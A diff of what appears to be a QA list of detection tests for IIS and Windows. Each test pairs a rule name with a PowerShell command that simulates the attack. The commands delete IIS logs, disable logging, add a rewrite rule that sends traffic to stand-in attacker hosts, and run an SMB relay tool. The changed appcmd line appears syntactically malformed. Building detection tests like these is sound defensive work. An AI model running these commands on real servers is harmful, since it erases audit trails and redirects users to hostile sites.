@@ -13,7 +13,9 @@ Remove-Item -Path "C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log"
 6. QA_RC308_C119_E.R_A_IIS_Disable Windows IIS HTTP Logging
 Set-WebConfigurationProperty -PSPath 'MACHINE/WEBROOT/APPHOST' -Filter "system.applicationHost/sites/site[@name='Default Web Site']/logfile" -Name "logFormat" -Value "Custom"
 7. QA_RC308_C120_E.R_M_IIS_Suspicious IIS URL GlobalRules Rewrite Via AppCmd
-& $env:SystemRoot\system32\inetsrv\appcmd.exe set config "Default Web Site" -section:system.webServer/rewrite/globalRules /+"[name='SuspiciousRule',matchUrl='/test',action.type='Rewrite',action.url='http://attacker.com']"
+
+Start-Process "C:\Windows\System32\inetsrv\appcmd.exe" -ArgumentList 'set config -section:system.webServer/rewrite/globalRules /+"[name=''MaliciousRule'',patternSyntax=''Wildcard'',stopProcessing=''true'',match url=''*.aspx'' /action type=''Rewrite'',url=''http://malicious-site.com/{R:0}'' /conditions /+"[input=''{{URL}}'',pattern=''*'' /]"'
+
 
 8. QA_RC308_C116_L.E.R_A_WIN_Potential SMB Relay Attack Tool Execution
 Invoke-Expression "python.exe C:\Path\to\smbrelayx.py -h"
